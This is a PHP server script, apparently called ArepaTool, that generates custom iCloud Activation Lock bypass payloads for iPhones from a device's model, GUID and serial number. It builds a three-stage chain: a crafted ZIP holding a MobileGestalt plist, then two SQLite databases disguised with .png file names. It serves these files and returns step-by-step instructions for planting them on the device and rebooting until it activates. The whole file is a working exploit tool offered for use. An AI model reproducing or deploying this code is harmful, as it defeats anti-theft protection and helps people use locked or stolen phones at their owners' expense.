<?php
/**
 * =====================================================
 * AREPATOOL iCLOUD BYPASS SERVER
 * =====================================================
 * 
 * Genera payloads personalizados para el bypass de iCloud
 * Compatible con iOS 18.x - 26.x (iPhone XR - iPhone 18)
 * 
 * Endpoints:
 *   GET  /                     → Status del servidor
 *   GET  /generate?prd=X&guid=Y&sn=Z → Genera payloads
 *   GET  /models               → Lista modelos soportados
 * 
 * @author ArepaTool Team
 * @version 1.0.0
 */

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle preflight
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

error_reporting(E_ALL);
ini_set('display_errors', 0);
ini_set('log_errors', 1);

// =====================================================
// CONFIGURATION
// =====================================================

$BASE_PATH = __DIR__;
$MAKER_PATH = dirname($BASE_PATH) . '/Maker';

// =====================================================
// UTILITY FUNCTIONS
// =====================================================

function generateRandomName($length = 16) {
    return bin2hex(random_bytes($length / 2));
}

function logDebug($msg, $level = 'INFO') {
    $timestamp = date('Y-m-d H:i:s');
    error_log("[ArepaTool Bypass] [$timestamp] [$level] $msg");
}

function readSQLDump($filename) {
    if (!file_exists($filename)) {
        throw new Exception("SQL dump file not found: $filename");
    }
    return file_get_contents($filename);
}

function createSQLiteFromDump($sqlDump, $outputFile) {
    // Remove unistr() functions (Oracle compatibility)
    $sqlDump = preg_replace_callback(
        "/unistr\s*\(\s*['\"]([^'\"]*)['\"]\\s*\)/i",
        function($matches) {
            $str = $matches[1];
            $str = preg_replace_callback(
                '/\\\\([0-9A-Fa-f]{4})/',
                function($m) {
                    return mb_convert_encoding(pack('H*', $m[1]), 'UTF-8', 'UCS-2BE');
                },
                $str
            );
            return "'" . str_replace("'", "''", $str) . "'";
        },
        $sqlDump
    );
    $sqlDump = preg_replace("/unistr\s*\(\s*(['\"][^'\"]*['\"])\s*\)/i", "$1", $sqlDump);
    
    $db = new SQLite3($outputFile);
    $statements = explode(';', $sqlDump);
    
    foreach ($statements as $statement) {
        $statement = trim($statement);
        if (!empty($statement) && strlen($statement) > 5) {
            @$db->exec($statement . ';');
        }
    }
    
    $db->close();
    return true;
}

function getBaseUrl() {
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'];
    return "$protocol://$host";
}

function cleanupOldFiles($basePath, $maxAgeMinutes = 60) {
    $dirs = ['firststp', '2ndd', 'last'];
    $cutoff = time() - ($maxAgeMinutes * 60);
    
    foreach ($dirs as $dir) {
        $path = "$basePath/$dir";
        if (!is_dir($path)) continue;
        
        foreach (new DirectoryIterator($path) as $item) {
            if ($item->isDot()) continue;
            if ($item->getMTime() < $cutoff) {
                $fullPath = $item->getPathname();
                if (is_dir($fullPath)) {
                    array_map('unlink', glob("$fullPath/*"));
                    @rmdir($fullPath);
                }
            }
        }
    }
}

// =====================================================
// ROUTING
// =====================================================

$requestUri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
$requestUri = rtrim($requestUri, '/');

// Route: Status
if ($requestUri === '' || $requestUri === '/') {
    echo json_encode([
        'success' => true,
        'service' => 'ArepaTool iCloud Bypass Server',
        'version' => '1.0.0',
        'status' => 'online',
        'endpoints' => [
            'GET /' => 'Server status',
            'GET /generate?prd=X&guid=Y&sn=Z' => 'Generate bypass payloads',
            'GET /models' => 'List supported models'
        ]
    ], JSON_PRETTY_PRINT);
    exit;
}

// Route: List models
if ($requestUri === '/models') {
    $models = [];
    foreach (new DirectoryIterator($MAKER_PATH) as $item) {
        if ($item->isDir() && !$item->isDot()) {
            $models[] = $item->getFilename();
        }
    }
    sort($models);
    echo json_encode([
        'success' => true,
        'count' => count($models),
        'models' => $models
    ], JSON_PRETTY_PRINT);
    exit;
}

// Route: Generate payloads
if ($requestUri === '/generate' || strpos($requestUri, '/generate') === 0) {
    try {
        // Cleanup old files periodically
        if (rand(1, 10) === 1) {
            cleanupOldFiles($BASE_PATH);
        }
        
        // Get parameters
        $prd = $_GET['prd'] ?? '';
        $guid = $_GET['guid'] ?? '';
        $sn = $_GET['sn'] ?? '';
        
        if (empty($prd) || empty($guid) || empty($sn)) {
            http_response_code(400);
            echo json_encode([
                'success' => false,
                'error' => 'Missing required parameters: prd, guid, sn'
            ]);
            exit;
        }
        
        // Validate GUID format
        if (!preg_match('/^[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}$/i', $guid)) {
            http_response_code(400);
            echo json_encode([
                'success' => false,
                'error' => 'Invalid GUID format. Expected: XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX'
            ]);
            exit;
        }
        
        $prdFormatted = str_replace(',', '-', $prd);
        $guid = strtoupper($guid);
        
        logDebug("Generating payload for: prd=$prdFormatted, guid=$guid, sn=$sn");
        
        // Find plist for device model
        $plistPath = "$MAKER_PATH/$prdFormatted/com.apple.MobileGestalt.plist";
        
        if (!file_exists($plistPath)) {
            http_response_code(404);
            echo json_encode([
                'success' => false,
                'error' => "Device model not supported: $prdFormatted",
                'hint' => 'Use GET /models to see supported devices'
            ]);
            exit;
        }
        
        $baseUrl = getBaseUrl();
        
        // =====================================================
        // STAGE 1: Create fixedfile (EPUB-like ZIP)
        // =====================================================
        
        $randomName1 = generateRandomName();
        $stage1Dir = "$BASE_PATH/firststp/$randomName1";
        mkdir($stage1Dir, 0755, true);
        
        // Create temporary directories
        $cachesDir = "$stage1Dir/Caches";
        mkdir($cachesDir, 0755, true);
        
        // Create mimetype file (required for EPUB)
        $mimetypeFile = "$cachesDir/mimetype";
        file_put_contents($mimetypeFile, "application/epub+zip");
        
        // Create ZIP archive
        $zipPath = "$stage1Dir/temp.zip";
        $zip = new ZipArchive();
        if (!$zip->open($zipPath, ZipArchive::CREATE)) {
            throw new Exception("Failed to create ZIP archive");
        }
        
        // Add files with proper compression
        $zip->addFile($mimetypeFile, "Caches/mimetype");
        $zip->setCompressionName("Caches/mimetype", ZipArchive::CM_STORE);
        $zip->addFile($plistPath, "Caches/com.apple.MobileGestalt.plist");
        $zip->close();
        
        // Cleanup temp files
        unlink($mimetypeFile);
        rmdir($cachesDir);
        
        // Rename to fixedfile
        $fixedFilePath = "$stage1Dir/fixedfile";
        rename($zipPath, $fixedFilePath);
        
        $stage1Url = "$baseUrl/firststp/$randomName1/fixedfile";
        logDebug("Stage 1 created: $stage1Url");
        
        // =====================================================
        // STAGE 2: Create BLDatabaseManager.sqlite
        // =====================================================
        
        $blDump = readSQLDump("$BASE_PATH/BLDatabaseManager.png");
        $blDump = str_replace('KEYOOOOOO', $stage1Url, $blDump);
        
        $randomName2 = generateRandomName();
        $stage2Dir = "$BASE_PATH/2ndd/$randomName2";
        mkdir($stage2Dir, 0755, true);
        
        $blSqlitePath = "$stage2Dir/BLDatabaseManager.sqlite";
        createSQLiteFromDump($blDump, $blSqlitePath);
        
        // Rename with obfuscated name
        $stage2FinalPath = "$stage2Dir/belliloveu.png";
        rename($blSqlitePath, $stage2FinalPath);
        
        $stage2Url = "$baseUrl/2ndd/$randomName2/belliloveu.png";
        logDebug("Stage 2 created: $stage2Url");
        
        // =====================================================
        // STAGE 3: Create downloads.28.sqlitedb
        // =====================================================
        
        $dlDump = readSQLDump("$BASE_PATH/downloads.28.png");
        $dlDump = str_replace('https://google.com', $stage2Url, $dlDump);
        $dlDump = str_replace('GOODKEY', $guid, $dlDump);
        
        $randomName3 = generateRandomName();
        $stage3Dir = "$BASE_PATH/last/$randomName3";
        mkdir($stage3Dir, 0755, true);
        
        $finalDbPath = "$stage3Dir/downloads.sqlitedb";
        createSQLiteFromDump($dlDump, $finalDbPath);
        
        // Rename with obfuscated name
        $stage3FinalPath = "$stage3Dir/applefixed.png";
        rename($finalDbPath, $stage3FinalPath);
        
        $stage3Url = "$baseUrl/last/$randomName3/applefixed.png";
        logDebug("Stage 3 created: $stage3Url");
        
        // =====================================================
        // SUCCESS RESPONSE
        // =====================================================
        
        echo json_encode([
            'success' => true,
            'message' => 'Bypass payloads generated successfully',
            'device' => [
                'model' => $prdFormatted,
                'serial' => $sn,
                'guid' => $guid
            ],
            'links' => [
                'step1_fixedfile' => $stage1Url,
                'step2_bldatabase' => $stage2Url,
                'step3_final' => $stage3Url
            ],
            'instructions' => [
                '1' => 'Download step3_final and push to /Downloads/downloads.28.sqlitedb',
                '2' => 'Reboot device and wait for iTunesMetadata.plist',
                '3' => 'Copy /iTunes_Control/iTunes/iTunesMetadata.plist to /Books/',
                '4' => 'Reboot again and wait for activation'
            ]
        ], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
        
        logDebug("Payload generation complete for $prdFormatted");
        
    } catch (Exception $e) {
        http_response_code(500);
        logDebug("Error: " . $e->getMessage(), 'ERROR');
        echo json_encode([
            'success' => false,
            'error' => $e->getMessage()
        ]);
    }
    exit;
}

// Route: Serve static files (payloads)
$staticDirs = ['firststp', '2ndd', 'last'];
foreach ($staticDirs as $dir) {
    if (strpos($requestUri, "/$dir/") === 0) {
        $filePath = $BASE_PATH . $requestUri;
        if (file_exists($filePath) && is_file($filePath)) {
            // Determine content type
            $ext = pathinfo($filePath, PATHINFO_EXTENSION);
            $contentTypes = [
                'png' => 'application/octet-stream',
                'sqlite' => 'application/octet-stream',
                'sqlitedb' => 'application/octet-stream',
                '' => 'application/octet-stream'
            ];
            $contentType = $contentTypes[$ext] ?? 'application/octet-stream';
            
            header("Content-Type: $contentType");
            header("Content-Length: " . filesize($filePath));
            header("Cache-Control: no-cache, no-store, must-revalidate");
            readfile($filePath);
            exit;
        }
    }
}

// 404 for unknown routes
http_response_code(404);
echo json_encode([
    'success' => false,
    'error' => 'Endpoint not found',
    'available_endpoints' => ['/', '/generate', '/models']
]);
